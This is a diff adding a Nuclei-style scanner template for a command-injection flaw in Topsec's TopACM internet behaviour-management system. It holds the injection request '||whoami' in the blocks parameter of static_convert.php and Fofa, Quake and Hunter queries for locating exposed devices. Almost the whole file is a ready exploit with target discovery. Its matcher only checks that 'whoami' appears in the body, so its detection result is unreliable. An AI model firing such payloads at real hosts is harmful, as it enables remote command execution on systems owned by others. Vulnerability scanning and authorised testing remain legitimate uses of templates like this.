@@ -1,0 +1,29 @@
+id: Topsec_TopACM_static_convert_RCE
+
+info:
+  name: Topsec_TopACM_static_convert_RCE
+  author: HK
+  severity: critical
+  description: 天融信上网行为管理系统 /view/IPV6/naborTable/static_convert.php接口blocks参数存在任意命令执行漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="/images/arrow03.png" && body="400-7770777"
+    Quaker-query: body="/images/arrow03.png" && body="400-7770777"
+    Hunter-query: body="/images/arrow03.png" && body="400-7770777"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||whoami HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+      - whoami
